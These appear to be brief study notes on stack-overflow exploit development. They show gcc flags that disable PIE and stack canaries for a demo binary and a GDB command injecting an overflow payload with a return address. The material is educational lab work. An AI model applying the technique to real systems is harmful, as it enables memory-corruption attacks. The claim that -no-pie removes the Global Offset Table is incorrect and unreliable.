# Exploit Development

## Stack overflow

Naturally, OSes are vigilant against stack overflows, so it's difficult to observe them as it is. Thus, the binary must be made with special flags:

**gcc -no-pie -fno-stack-protector -o stack_demonstration stack_demonstration.c**

**-no-pie**: generates an executable without the Global Offset Table. Without this, the functions will be randomly put in the virtual memory, and exploitation PoC will be tough.

**-fno-stack-protector**: Disables canaries, or stack protector that know when the stack is modified.

**gcc -mpreferred-stack-boundary=3 -ggdb stack_demonstration.c -o stack_demonstration**

*GDB*: can easily inject bytes as **run $(python3 -c "print('AAAAAAAAAAAAAAAAAAAAAAAA\xf8\x51\x55\x55\x55\x55');")**
